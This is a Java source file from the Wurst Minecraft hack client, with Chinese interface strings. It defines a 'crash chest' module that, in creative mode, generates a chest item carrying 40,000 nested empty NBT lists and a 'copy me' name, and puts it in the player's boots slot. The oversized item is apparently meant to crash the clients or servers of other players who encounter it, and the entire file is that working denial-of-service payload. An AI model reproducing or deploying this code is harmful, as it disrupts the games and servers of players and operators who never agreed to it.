/*
 * Copyright (c) 2014-2024 Wurst-Imperium and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import net.minecraft.block.Blocks;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.text.Text;
import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.hack.Hack;
import net.wurstclient.util.ChatUtils;

@SearchTags({"crash chest"})
public final class CrashChestHack extends Hack
{
	public CrashChestHack()
	{
		super("崩溃箱子");
		
		setCategory(Category.ITEMS);
	}
	
	@Override
	protected void onEnable()
	{
		if(!MC.player.getAbilities().creativeMode)
		{
			ChatUtils.error("仅限创造模式。");
			setEnabled(false);
			return;
		}
		
		if(!MC.player.getInventory().getArmorStack(0).isEmpty())
		{
			ChatUtils.error("请清空你的鞋子槽。");
			setEnabled(false);
			return;
		}
		
		// generate item
		ItemStack stack = new ItemStack(Blocks.CHEST);
		NbtCompound nbtCompound = new NbtCompound();
		NbtList nbtList = new NbtList();
		for(int i = 0; i < 40000; i++)
			nbtList.add(new NbtList());
		nbtCompound.put("www.wurstclient.net", nbtList);
		stack.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(nbtCompound));
		stack.set(DataComponentTypes.CUSTOM_NAME, Text.literal("复制我"));
		
		// give item
		MC.player.getInventory().armor.set(0, stack);
		ChatUtils.message("物品已放置在你的鞋子槽中。");
		setEnabled(false);
	}
}
